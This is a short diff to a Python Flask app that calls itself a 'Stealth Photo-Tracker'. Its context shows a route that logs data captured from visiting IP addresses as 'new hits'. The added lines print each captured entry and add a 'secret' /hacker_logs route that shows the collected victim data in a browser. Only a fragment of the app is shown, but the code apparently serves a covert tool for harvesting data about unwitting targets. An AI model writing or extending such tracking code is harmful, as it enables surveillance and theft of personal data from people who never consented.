@@ -34,8 +34,19 @@ def log_data():
         f.write(json.dumps(log_entry, indent=4) + "\n" + "-"*50 + "\n")
         
     print(f"\n[+] BOOM! NEW HIT! Data captured from IP: {ip_address}")
+    print(json.dumps(log_entry, indent=4))
     print(f"[*] Check {LOG_FILE} for details.\n")
     return "OK", 200
+
+# SECRET ROUTE TO VIEW LOGS
+@app.route('/hacker_logs')
+def view_logs():
+    if os.path.exists(LOG_FILE):
+        with open(LOG_FILE, 'r') as f:
+            content = f.read()
+        # Return as plain text so it looks like raw hacker data in the browser
+        return f"<pre>{content}</pre>"
+    return "No targets captured yet."
 
 if __name__ == '__main__':
     print("[*] Stealth Photo-Tracker is running!")
